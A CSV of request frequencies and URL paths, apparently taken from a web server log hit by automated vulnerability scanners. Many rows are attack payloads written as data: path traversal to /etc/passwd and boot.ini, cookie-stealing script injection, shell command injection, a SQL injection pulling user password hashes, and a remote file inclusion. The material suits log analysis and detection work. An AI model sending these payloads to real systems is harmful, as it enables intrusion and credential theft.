Frequency,Resource
1,/newuser?Image=../../database/rbsserv.mdb
1,/base/webmail/readmsg.php?mailbox=../../../../../../../../../../../../../../etc/passwd&id=1
1,/search/results.stm?query=&lt;script&gt;alert('vulnerable');&lt;/script&gt;
1,/TvLBvkHh.xbb
1,multihtml.pl?multi=/etc/passwd%00html
1,"/webchat/register.php?register=yes&username=OverG&email=<script>alert%20(\""Vulnerable\"")</script>&email1=<script>alert%20(\""Vulnerable\"")</script>"
1,/kboard/
1,/hmstat.htm
1,/cgi-bin/dcshop/orders/orders.txt
1,update.dpgs
1,/PMA2/index.php
1,"viewcvs.cgi/viewcvs/viewcvs/?sortby=rev\""><script>alert('Vulnerable')</script>;"
1,/cgi-bin/htgrep?file=index.html&hdr=/etc/passwd
1,/~/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.aspx
1,/502/
1,technote/main.cgi?board=FREE_BOARD&command=down_load&fileNikto=/../../../../../../../../../../etc/passwd
1,/TvLBvkHh.ee
1,bb-hist?HISTFILE=../../../../../../../../../../etc/passwd
1,/php/php.exe?c:\winnt\boot.ini
1,/users.php?mode=profile&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,/TvLBvkHh.iso2022-jp
1,/cgi-bin/csChatRBox.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
1,/TvLBvkHh.phpp
1,/cgi-bin/lwgate.cgi
1,.
1,/cgi-bin/nph-emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/cgi-bin/search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini
1,/webmail/
1,"/index.php?file=Liens&op=\""><script>alert('Vulnerable');</script>"
1,/ISSamples/SQLQHit.asp
1,/pafiledb/includes/team/file.php
1,/cgi-bin/emumail/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/cgi-bin/quickstore.cgi?page=../../../../../../../../../../etc/passwd%00html&cart_id=
1,/cgi-bin/redirect
1,/cgi-bin/bb-hist?HISTFILE=../../../../../../../../../../etc/passwd
1,/ows/restricted.show
1,mt-static/mt-check.cgi
1,/TvLBvkHh.tcl
1,/cgi-bin/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|
1,/servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../boot.ini%00
5,/phpmyadmin/_scripts/setup.php
1,htsearch?-c/nonexistant
1,/shopping400.mdb
1,Count.cgi
1,"tst.bat%7Cdir%20..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C,"
1,/cgi-bin/architext_query.pl
1,/_cti_pvt/
1,/cgi-bin/html2wml.cgi
1,/cfdocs/cfcache.map
4,/index.action
1,/cgi-bin/admin/admin.cgi
1,/TvLBvkHh.php=
1,/admin-serv/config/admpw
1,/TvLBvkHh.php3
1,/simplebbs/users/users.php
1,infosrch.cgi
1,/TvLBvkHh.php4
1,/cgi-bin/.cobalt
1,/TvLBvkHh.php+
1,/modules.php?name=Your_Account&op=userinfo&username=bla<script>alert(document.cookie)</script>
1,cgiwrap/%3Cfont%20color=red%3E
1,/TvLBvkHh.axd
1,/cgi-bin/mkilog.exe
1,/TvLBvkHh.render_warning_screen
4,/wls-wsat/CoordinatorPortType
3,/muieblackcat
1,/com
1,/cgi-bin/ezshopper/search.cgi?user_id=id&database=dbase1.exm&template=../../../../../../../etc/passwd&distinct=1
1,/cgi-bin/erba/start/%3Cscript%3Ealert('Vulnerable');%3C/script%3E
1,/vgn/vr/Select
1,/cgi-bin/sscd_suncourier.pl
1,/index.php?page=../../../../../../../../../../boot.ini
1,/cgi-bin/DCShop/auth_data/auth_user_file.txt
1,/jgb_eng_php3/cfooter.php3
1,simple/view_page?mv_arg=|cat%20/etc/passwd|
1,/cgi-bin/loadpage.cgi?user_id=1&file=..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini
1,/TvLBvkHh.passwd
1,/index.do
1,/lpt9
1,pollit/Poll_It_SSI_v2.0.cgi?data_dir=\etc\passwd%00
1,csNewsPro.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
1,ezman.cgi
1,/error/500error.jsp?et=1<script>alert('Vulnerable')</script>;
1,/cgi-bin/horde/test.php?mode=phpinfo
1,/tftpphone/
1,/anthill/login.php
1,/cgi-bin/dcshop/auth_data/auth_user_file.txt
1,guestbook.pl
1,/cgi-bin/lwgate
1,/config.php
1,/cgi-bin/calendar.pl
1,/cgi-bin/ans.pl?p=../../../../../usr/bin/id|&blah
1,/cgi-bin/mt/mt.cfg
1,/TvLBvkHh.jsp+
1,/home.php?arsc_language=elvish
1,/phpwebfilemgr/index.php?f=../../../../../../../../../etc
1,"/emailfriend/emailnews.php?id=\""<script>alert(document.cookie)</script>"
1,/cutenews/index.php?debug
1,/server/
1,/htbin/
1,/catalog.nsf
1,/TvLBvkHh.conf
1,/officescan/cgi/cgiChkMasterPwd.exe
1,/SiteServer/Admin/commerce/foundation/DSN.asp
1,/put/cgi-bin/putport.exe?SWAP&BOM&OP=none&Lang=en-US&PutHtml=../../../../../../../../etc/passwd
1,/ss000007.pl?PRODREF=<script>alert('Vulnerable')</script>
1,/TvLBvkHh.INC
1,/search.asp?term=<%00script>alert('Vulnerable')</script>
1,/cgi-bin/boozt/admin/index.cgi?section=5&input=1
1,/nsn/..%5Cwebdemo/env.bas
1,/cgi-bin/ImageFolio/admin/admin.cgi
1,/webcart/carts/
1,hello.bat?&dir+c:\\
1,moin.cgi?test
1,/TvLBvkHh.pt
1,/sips/sipssys/users/a/admin/user
1,loadpage.cgi?user_id=1&file=..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini
1,/blah_badfile.shtml
1,/phpmyadmin2/index.php
1,/mail.box
1,/index.aspx%5C
1,/index.php/content/search/?SectionID=3&SearchText=<script>alert(document.cookie)</script>
1,/admin/browse.asp?FilePath=c:\&Opt=2&level=0
2,/cgi-bin/cgiwrap/~web
5,/PhpMyAdmin/scripts/setup.php
1,input.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
1,/index.php/%5C%22%3E%3Cscript%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3C
1,/cgi-bin/whois.cgi?lookup=;&ext=/bin/cat%20/etc/passwd
1,/TvLBvkHh.dk
1,/TvLBvkHh.pwd
1,/cgi-bin/banner.cgi
1,redir.exe?URL=http%3A%2F%2Fwww%2Egoogle%2Ecom%2F%0D%0A%0D%0A%3CSCRIPT%3Ealert%28%27Vulnerable%27%29%3C%2FSCRIPT%3E
1,/TvLBvkHh.it
1,/jsp/jspsamp/jspexamples/viewsource.jsp?source=../../../../../../../../../../etc/passwd
1,/tiki/tiki-install.php
1,/nsn/..%5Cutil/set.bas
1,/edittag/edittag.cgi?file=%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd
1,/TvLBvkHh.password
1,/TvLBvkHh.ca
1,/Config1.htm
1,whois_raw.cgi?fqdn=%0Acat%20/etc/passwd
1,"/cgi-bin/sawmill5?rfcf+%22/etc/passwd%22+spbn+1,1,21,1,1,1,1"
1,nph-error.pl
2,/cgi-bin/cgiwrap/~smtp
1,pals-cgi?palsAction=restart&documentName=/etc/passwd
1,/search/?SectionIDOverride=1&SearchText=<script>alert(document.cookie);</script>
1,perl?-v
1,/gb/index.php?login=true
1,/cgi-bin/ss
1,/TvLBvkHh.cs
1,/TvLBvkHh.utf8
1,/s9sCh.csp
1,/cgi.cgi/
1,formmail.cgi
1,/cgi/
1,/phpmyadmin/config.php
1,/forums/config.php
1,/instantwebmail/message.php
1,/app/provision/
1,"/search/index.cfm?<script>alert(\""Vulnerable\"")</script>"
1,/addressbook/index.php?name=<script>alert('Vulnerable')</script>
1,redirect
2,/default.htm%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20
1,/cgi-bin/spin_client.cgi?aaaaaaaa
1,/TvLBvkHh.js
1,/cgi-bin/betsie/parserl.pl/%3Cscript%3Ealert('Vulnerable')%3C/script%3E;
1,/Xcelerate/LoginPage.html
1,/node/view/666%5C%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
1,/TvLBvkHh.thtml
2,cgiwrap/~noaccess
1,/cgi-bin/aglimpse.cgi
1,/cgi-bin/dbman/db.cgi?db=no-db
1,/shopa_sessionlist.asp
1,/WEB-INF./web.xml
1,/nsn/..%5Cweb/fdir.bas
1,ezshopper/search.cgi?user_id=id&database=dbase1.exm&template=../../../../../../../etc/passwd&distinct=1
1,/TvLBvkHh.fr
1,test-cgi.tcl
1,compatible.cgi
1,/cgi-bin/common/listrec.pl?APP=qmh-news&TEMPLATE=;ls%20/etc|
1,/scripts/samples/search/filetime.idq
1,/profiles.php?uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,/cgi-bin/14all.cgi?cfg=../../../../../../../../etc/passwd
2,/cgi-bin/cgiwrap/~smmsp
1,/TvLBvkHh.btr
1,/TvLBvkHh.old
1,/exchange/lib/PUBFLD.INC
1,classified.cgi
1,/phpEventCalendar/file_upload.php
1,/cgi-bin/calendar
1,/index.php?action=storenew&username=<script>alert('Vulnerable')</script>
1,/TvLBvkHh.cp866
2,cgiwrap/~guest
2,//MyAdmin/scripts/setup.php
1,com5..........................................................................................................................................................................................................................box
1,/cgi-bin/stats/statsbrowse.asp?filepath=c:\&Opt=3
1,/phpMyadmin_bak/index.php
1,/../../../../../../../etc/passwd
1,/cbms/usersetup.php
1,/smg_Smxcfg30.exe?vcc=3560121183d3
1,/xml/
1,/TvLBvkHh.html
1,/modules.php?op=modload&name=Web_Links&file=index&l_op=viewlink
1,/SiteServer/Admin/knowledge/persmbr/VsPrAuoEd.asp
1,/cgi-bin/archie
1,/cgi-bin/test-cgi?/*
1,/webMathematica/MSP?MSPStoreID=..\..\..\..\..\..\..\..\..\..\boot.ini&MSPStoreType=image/gif
1,erba/start/%3Cscript%3Ealert('Vulnerable');%3C/script%3E
1,/cgi-bin/badmin.cgi
1,/vgn/ac/data
1,/cgi-bin/awstats.pl
1,/upload.asp
1,/supporter/index.php?t=tickettime&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;
2,/login.asp
1,/cgi-bin/main.cgi?board=FREE_BOARD&command=down_load&fileNikto=../../../../../../../../../../etc/passwd
1,/TvLBvkHh.mdb+
1,/viewpage.php?file=/etc/passwd
1,input2.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
1,webmap.cgi
1,"/emailfriend/emailarticle.php?id=\""<script>alert(document.cookie)</script>"
1,/phpping/index.php?pingto=www.test.com%20|%20dir%20c:\\
1,/digium/
1,/phptonuke.php?filnavn=/etc/passwd
2,/login.aspx
2,/cgi-bin/pbcgi.cgi?Nikto=Joe%Camel&email=%3CSCRIPT%3Ealert%28%27Vulnerable%27%29%3B%3C%2FSCRIPT%3E
1,/cgi-bin/ws_ftp.ini
1,data/fetch.php?page=
1,/cgi-bin/loadpage.cgi?user_id=1&file=../../../../../../../../../../etc/passwd
2,/cgi-bin/cgiwrap/~operator
1,common/listrec.pl?APP=qmh-news&TEMPLATE=;ls%20/etc|
1,/spip/
1,/cgi-bin/mail/nph-mr.cgi?do=loginhelp&configLanguage=../../../../../../../etc/passwd%00
2,/cgi-bin/cart.pl?db='
2,/msadc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir+c:%5c
1,/cgi-bin/webplus.exe?about
1,/TvLBvkHh.cgi
1,/SQLQHit.asp
1,gm.cgi
1,/script%3Ealert('Vulnerable')%3C/script%3E.cfm
1,/grandstream/
1,/PLCM/
1,/cgi-bin/way-board.cgi?db=/etc/passwd%00
1,/cgi-bin-sdb/printenv
1,/supporter/index.php?t=ticketfiles&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;
1,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.shtml
2,/templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script>
1,/exchange/lib/GETWHEN.INC
1,/search?NS-query-pat=../../../../../../../../../../etc/passwd
1,/scripts/samples/search/filesize.idq
1,/cgi-bin/mrtg.cfg?cfg=../../../../../../../../etc/passwd
1,/cgi-bin/sendtemp.pl?templ=../../../../../../../../../../etc/passwd
1,/default.asp
1,/USER/CONFIG.AP
1,LWGate.cgi
1,/TvLBvkHh.xsql
2,cart.pl?db='
1,/pms.php?action=send&recipient=DESTINATAIRE&subject=happy&posticon=javascript:alert('Vulnerable')&mode=0&message=Hello
1,/vgn/stylepreviewer
1,empower?DB=whateverwhatever
2,atk/javascript/class.atkdateattribute.js.php?config_atkroot=http://cirt.net/rfiinc.txt?
1,/cgi-bin/webdist.cgi?distloc=;cat%20/etc/passwd
3,///
1,/default.htm
1,/cgi-win/
2,cgiwrap/~smmsp
1,anacondaclip.pl?template=../../../../../../../../../../etc/passwd
1,Pbcgi.exe
1,/TvLBvkHh.apw
1,//../../../../../../../../../../boot.ini
1,/TvLBvkHh.notes
1,cachemgr.cgi
1,/cfdocs/snippets/evaluate.cfm
1,/SiteServer/admin/
1,/Admin_files/order.log
1,/vgn/record/previewer
1,newsdesk.cgi?t=../../../../../../../../../../etc/passwd
13,/manager/html
1,/gxp280/
1,/fcgi-bin/
1,campas?%0acat%0a/etc/passwd%0a
1,/cgi-bin/smartsearch/smartsearch.cgi?keywords=|/bin/cat%20/etc/passwd|
1,/cbms/editclient.php
1,/modules.php?name=Classifieds&op=ViewAds&id_subcatg=75&id_catg=<script>alert('Vulnerable')</script>
1,/cgi-bin/nph-error.pl
1,cgiemail-1.4/cgicso?query=AAA
1,/TvLBvkHh.SSIFilter
1,boozt/admin/index.cgi?section=5&input=1
1,/tftpserver/
1,/doc/webmin.config.notes
1,/cgi-bin/moin.cgi?test
1,/blah123.php
1,/iissamples/issamples/query.idq?CiTemplate=../../../../../../../../../../winnt/win.ini
1,/cgi-bin/csLiveSupport.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
1,/web.config
2,cgiwrap/~unknown
1,/servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../etc/passwd%00
1,/TvLBvkHh.types
1,/cgi-bin/echo.bat
1,/cgi-bin/search
1,/guestbook/admin/o12guest.mdb
1,/cgi-bin/simple/view_page?mv_arg=|cat%20/etc/passwd|
1,/cgi-bin/ibill.pm
1,emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/default.php?error_message=%3Cscript%20language=javascript%3Ewindow.alert%28document.cookie%29;%3C/script%3E
1,/modules.php?name=Surveys&pollID=<script>alert('Vulnerable')</script>
1,"/ldap/cgi-bin/ldacgi.exe?Action=<script>alert(\""Vulnerable\"")</script>"
1,/%25a%25s%25p%25d
1,/getaccess
3,/%5C/
1,query?mss=%2e%2e/config
1,/SiteServer/Admin/knowledge/persmbr/VsLsLpRd.asp
1,/TvLBvkHh.phtml
1,/phorum/admin/footer.php?GLOBALS[message]=<script>alert('Vulnerable')</script>
1,/nsn/..%5Cutil/userlist.bas
1,/hola/admin/cms/htmltags.php?datei=./sec/data.php
1,/TvLBvkHh.snp
1,/TvLBvkHh.php3+
1,"/servlet/CookieExample?cookiename=<script>alert(\""Vulnerable\"")</script>"
1,WS_FTP.ini
1,/eng/start/StatPtrGen.htm
1,/vgn/ac/esave
1,YaBB.pl?board=news&action=display&num=../../../../../../../../../../etc/passwd%00
1,testcgi.exe
1,/replymsg.php?send=1&destin=<script>alert('Vulnerable')</script>
1,/TvLBvkHh.config~
1,/nsn/..%5Cutil/type.bas
1,/cgi-bin/foxweb.dll
1,/guestbook/admin.php
1,/provisioning/
1,/blah-whatever-badfile.jsp
1,/tiki/
1,/TvLBvkHh.chl+
1,/TvLBvkHh.iso2022-kr
1,/typo3conf/localconf.php
1,viewcvs.cgi/viewcvs/?cvsroot=<script>alert('Vulnerable')</script>
1,/cgi-bin/shop/orders/orders.txt
1,post-query
1,/ticket.php?id=99999
1,/TvLBvkHh.wwwacl
1,/lists/admin/
1,/search/htx/SQLQHit.asp
1,shtml.dll
1,/TvLBvkHh.stat
1,/a.jsp/%3Cscript%3Ealert('Vulnerable')%3C/script%3E
1,/WebAdmin.dll?View=Logon
1,/TvLBvkHh.dat
1,/search?NS-query-pat=..\..\..\..\..\..\..\..\..\..\boot.ini
1,query
1,/inc/dbase.php
1,/mailman/options/yourlist?language=en&email=&lt;SCRIPT&gt;alert('Vulnerable')&lt;/SCRIPT&gt;
1,/cgi-bin/orders/orders.txt
1,"/phpwebsite/index.php?module=pagemaster&PAGE_user_op=view_page&PAGE_id=10\""><script>alert('Vulnerable')</script>&MMN_position=[X:X]"
1,/../../../../../../../../../../etc/passwd
1,/cgi-bin/guestbook/passwd
1,/cfdocs/expeval/openfile.cfm
1,ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|
1,/TvLBvkHh.SMAIL893
1,/forums/index.php?board=;action=login2&user=USERNAME&cookielength=120&passwrd=PASSWORD<script>alert('Vulnerable')</script>
1,/SiteServer/Admin/knowledge/dsmgr/users/UserManager.asp
1,/cfdocs/cfmlsyntaxcheck.cfm
1,/cgi-bin/awstats/awstats.pl
1,/.../.../.../.../.../.../.../.../.../boot.ini
1,/rtm.log
1,/weblogic
1,/cgi-bin/vq/demos/respond.pl?<script>alert('Vulnerable')</script>
1,/bb000001.pl%3Cscript%3Ealert('Vulnerable')%3C/script%3E
1,/database/db2000.mdb
1,"/_mem_bin/formslogin.asp?\""><script>alert('Vulnerable')</script>"
5,/./
1,"FormMail.cgi?<script>alert(\""Vulnerable\"");</script>"
1,"/phpwebsite/index.php?module=fatcat&fatcat[user]=viewCategory&fatcat_id=1%00+\""><script>alert('Vulnerable')</script>"
1,post32.exe%7Cdir%20c:%5C%5C
1,/junk.aspx
1,sscd_suncourier.pl
1,/TvLBvkHh.sql
1,mt/mt-check.cgi
1,/SiteServer/Admin/knowledge/dsmgr/default.asp
1,/modules/Submit/index.php?op=pre&title=<script>alert(document.cookie);</script>
1,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.jsp
2,/phpma/index.php
1,story.pl?next=../../../../../../../../../../etc/passwd%00
1,myguestbook.cgi?action=view
1,/current/index.php?site=demos&bn=../../../../../../../../../../etc/passwd%00
1,/nsn/..%5Cutil/glist.bas
2,pbcgi.cgi?name=Joe%Camel&email=%3CSCRIPT%3Ealert%28%27Vulnerable%27%29%3B%3C%2FSCRIPT%3E
1,/TvLBvkHh.xls
2,/admin/phpmyadmin/index.php
1,/horde/test.php?mode=phpinfo
2,/typo3/phpmyadmin/index.php
1,/upd/
1,/cgi-bin/mrtg.cgi?cfg=blah
1,"/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*"
1,photo/protected/manage.cgi
1,"/emailfriend/emailfaq.php?id=\""<script>alert(document.cookie)</script>"
1,aglimpse.cgi
1,/examples/jsp/source.jsp??
1,FormHandler.cgi?realNikto=aaa&email=aaa&reply_message_template=%2Fetc%2Fpasswd&reply_message_from=sq%40example.com&redirect=http%3A%2F%2Fwww.example.com&recipient=sq%40example.com
1,/SiteServer/Admin/commerce/foundation/driver.asp
1,mailit.pl
1,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.stm
1,dcshop/auth_data/auth_user_file.txt
1,/cgi-shl/win-c-sample.exe
3,/ccvv
1,/cgi-bin/smartsearch.cgi?keywords=|/bin/cat%20/etc/passwd|
1,webgais
1,horde/test.php?mode=phpinfo
2,/cgi-bin/formmail.pl
1,/download.php?sortby=&dcategory=<script>alert('Vulnerable')</script>
2,/article.cfm?id=1'<script>alert(document.cookie);</script>
1,/junk988.aspx%5C
1,mail/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,sojourn.cgi?cat=../../../../../../../../../../etc/password%00
1,plusmail
1,/modules.php?op=modload&name=FAQ&file=index&myfaq=yes&id_cat=1&categories=%3Cimg%20src=javascript:alert(9456);%3E&parent_id=0
2,/cgi-bin/wrap
1,perl.exe
1,webplus?script=../../../../../../../../../../etc/passwd
1,/a?<script>alert('Vulnerable')</script>
1,/cgi-bin/shop/auth_data/auth_user_file.txt
1,/WEB-INF/web.xml
1,/phpimageview.php?pic=javascript:alert(8754)
1,download.cgi
1,/TvLBvkHh.koi8-r
1,probecontrol.cgi?command=enable&username=cancer&password=killer
2,/cgi-bin/pbcgi.cgi?name=Joe%Camel&email=%3CSCRIPT%3Ealert%28%27Vulnerable%27%29%3B%3C%2FSCRIPT%3E
1,/ssdefs/
1,auktion.cgi?menue=../../../../../../../../../../etc/passwd
1,/TvLBvkHh.el
1,cgicso?query=<script>alert('Vulnerable')</script>
1,/cgi-bin/af.cgi?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd
1,"/cgi-bin/alibaba.pl%7Cdir%20..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C,"
1,/phpmyadmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
1,/cgi-bin/14all-1.1.cgi?cfg=../../../../../../../../etc/passwd
1,whois/whois.cgi?lookup=;&ext=/bin/cat%20/etc/passwd
1,/scripts/httpodbc.dll
2,/cgi-bin/wwwwais
1,/modules.php?op=modload&name=WebChat&file=index&roomid=<script>alert('Vulnerable')</script>
1,/cgi-perl/
1,/TvLBvkHh.show
1,/admin-serv/tasks/configuration/ViewLog?file=passwd&num=5000&str=&directories=admin-serv%2Flogs%2f..%2f..%2f..%2f..%2f..%2f..%2fetc&id=admin-serv
1,/cgi-bin/diagnose.cgi
1,/TopSitesdirectory/help.php?sid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,/TvLBvkHh.java
1,/modules.php?name=Your_Account&op=userinfo&uname=<script>alert('Vulnerable')</script>
1,/cgi-bin/classifieds/index.cgi
2,/cgi-bin/cgiwrap/~sys
1,/cgi-bin/Album?mode=album&album=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc&dispsize=640&start=0
4,/index.php
1,/cgi-bin/gH.cgi
1,/cgi-bin/opendir.php?/etc/passwd
1,/SiteServer/admin/findvserver.asp
1,"/forumdisplay.php?GLOBALS[]=1&f=2&comma=\"".system('id').\"""
1,calendar_admin.pl?config=|cat%20/etc/passwd|
1,fpsrvadm.exe
1,/PMA/index.php
1,nph-emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/cgi-bin/fpsrvadm.exe
1,"/msadm/user/login.php3?account_name=\""><script>alert('Vulnerable')</script>"
1,/polycomftp/
1,/cgi-bin/retrieve_password.pl
1,handler.cgi
2,cgiwrap/~nuucp
1,perl
1,snorkerz.bat
1,nph-showlogs.pl?files=../../&filter=.*&submit=Go&linecnt=500&refresh=0
1,/sunshop.index.php?action=storenew&username=<script>alert('Vulnerable')</script>
1,/cgi-bin/bigconf.cgi
1,/sipphones/
1,/pages/htmlos/%3Cscript%3Ealert('Vulnerable');%3C/script%3E
1,/cgi-bin/bigconf.cgi?command=view_textfile&file=/etc/passwd&filters=
2,/MyAdmin/scripts/setup.php
1,admin/admin.cgi
1,/cfdocs/examples/parks/detail.cfm
1,/geeklog/users.php
1,/cgi-bin/flexform
1,dumpenv.pl
1,mkplog.exe
2,/cgi-bin/cgiwrap/~unknown
1,snorkerz.cmd
1,YaBB/YaBB.cgi?board=BOARD&action=display&num=<script>alert('Vulnerable')</script>
1,test-cgi.exe?<script>alert(document.cookie)</script>
2,cgiwrap/~nobody
1,"/ca000001.pl?ACTION=SHOWCART&hop=\""><script>alert('Vulnerable')</script>&PATH=acatalog%2f"
2,/_mem_bin/auoconfig.asp
1,/cgi-home/
1,/phpMyAdmin/index.php
1,/cgi-bin/mt/mt-check.cgi
1,/TvLBvkHh.CGI
1,cgiwrap/~ZA3Z1
1,"/msadm/domain/index.php3?account_name=\""><script>alert('Vulnerable')</script>"
1,/exchange/lib/PAGEUTIL.INC
1,/phptonuke.php?filnavn=<script>alert('Vulnerable')</script>
1,/TvLBvkHh.shtm
1,guestbook.cgi
1,ibill.pm
1,cmd.exe?/c+dir
1,/TvLBvkHh.cellsprint
1,/cgi-bin/dumpenv.pl
1,/cgi-bin/htsearch?exclude=%60/etc/passwd%60
2,/index
1,/TvLBvkHh.net
1,/exchange/lib/DELETE.INC
1,/TvLBvkHh.back
1,/file-that-is-not-real-2002.php3
2,cgiwrap/~test
1,/examples/cookie
1,/cgi-bin/testing_whatever
1,"/soinfo.php?\""><script>alert('Vulnerable')</script>"
1,/scripts/repost.asp
1,/cgi-bin/hello.bat?&dir+c:\\
1,SGB_DIR/superguestconfig
1,/exchange/lib/SESSION.INC
1,/themes/mambosimple.php?detection=detected&sitename=</title><script>alert(document.cookie)</script>
1,/mitel/
5,/hp/device/this.LCDispatcher
1,/phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>
1,/aMiWjJNIot
1,/TvLBvkHh.mdb
1,/index.php?top_message=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,/&lt;script&gt;alert('Vulnerable');&lt;/script&gt;
1,/iissamples/issamples/SQLQHit.asp
2,/myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent
1,/index.php/123
1,/cgi-bin/csGuestBook.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
1,/ews/ews/architext_query.pl
1,/nph-showlogs.pl?files=../../../../../../../../etc/passwd&filter=.*&submit=Go&linecnt=500&refresh=0
1,/tftpboot/backup/
1,/TvLBvkHh.ASP
1,scoadminreg.cgi
1,smartsearch/smartsearch.cgi?keywords=|/bin/cat%20/etc/passwd|
1,/comments.php?subject=<script>alert('Vulnerable')</script>&comment=<script>alert('Vulnerable')</script>&pid=0&sid=0&mode=&order=&thold=op=Preview
1,/index.jsp%00x
1,/pma-old/index.php
1,/cgi-bin/urlcount.cgi?%3CIMG%20SRC%3D%22%22%20ONERROR%3D%22alert%28%27Vulnerable%27%29%22%3E
1,/webcgi/
1,/?mod=some_thing&op=browse
1,/iissamples/issamples/sqlqhit.asp
1,/cgi-bin/alienform.cgi?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd
2,cgiwrap/~operator
1,/cgi-bin/testcgi.exe
1,/SiteServer/Admin/knowledge/persmbr/vs.asp
1,/SPA942/
1,/readme.eml
1,/?mod=<script>alert(document.cookie)</script>&op=browse
1,/vgn/jsp/previewer
1,/cgi-bin/search.php?searchstring=<script>alert(document.cookie)</script>
1,/TvLBvkHh.bat%7Cdir
1,/tsweb/
1,/cgi-bin/cmd.exe?/c+dir
1,date
1,technote/main.cgi?board=FREE_BOARD&command=down_load&filename=/../../../../../../../../../../etc/passwd
1,/cgi-bin/photo/protected/manage.cgi
1,/cgi-bin/fortune
1,/exchange/lib/JSUTIL.INC
2,/cgi-bin/cgiwrap/~sshd
2,/tools/phpMyAdmin/index.php
1,/cgi-bin/search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini
1,blog/mt-load.cgi
1,/cgi-bin/uptime
1,/forums/modules/vwar/admin/config.php
1,/TvLBvkHh.LOG
